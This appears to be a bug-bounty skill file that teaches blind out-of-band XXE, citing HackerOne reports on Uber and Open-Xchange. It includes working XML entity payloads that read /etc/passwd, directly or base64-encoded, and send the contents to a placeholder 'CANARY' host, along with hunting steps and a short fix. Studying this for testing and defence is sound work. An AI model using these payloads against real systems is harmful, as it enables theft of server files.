---
name: xxe-blind-oob
description: Blind/out-of-band XXE via external parameter entities and error/file exfiltration channels (ftp://, gopher://, data:). Teaches the OOB XXE chain when no response echoes the entity.
sources: hackerone_public
report_count: 1
---

# Blind / Out-of-Band XXE

**Reports**: Uber — "Blind OOB XXE at http://ubermovement.com/" (hackerone.com/reports/154096, $500); Open-Xchange — "Blind XXE via PowerPoint files" (#334488, $2,000).

## Why it matters (the new lesson)
Most XXE you'll find is *blind*: the entity result isn't echoed. You still exfil data using **external parameter entities** that load a remote DTD, then send file contents out via an `http://`/`ftp://` request to your Collaborator — all without seeing the response body.

## How it works
1. Inject a parameter entity that fetches your DTD:
```xml
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://CANARY/?x=%file;'>">
  %eval; %exfil;
]>
```
2. The server expands `%file` (reads the file) and requests `http://CANARY/?x=<contents>` — your Collaborator receives the exfiled data in the URL.

## How to hunt for it
1. Any XML input (SOAP, SAML, docx/xlsx/pptx, SVG, XMP, plist).
2. Start with a simple OOB test: `<!ENTITY % x SYSTEM "http://CANARY/"> %x;` → DNS/HTTP hit confirms XXE.
3. Escalate to file exfil via parameter entities + a remote DTD (hosted on your server).

## Payloads
```
<!ENTITY % x SYSTEM "http://CANARY/"> %x;
<!ENTITY % f SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % exfil SYSTEM "http://CANARY/?d=%f;"> %exfil;
```

## Fix
Disable DTD + external entities (`LIBXML_NONET`, `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl",true)`).
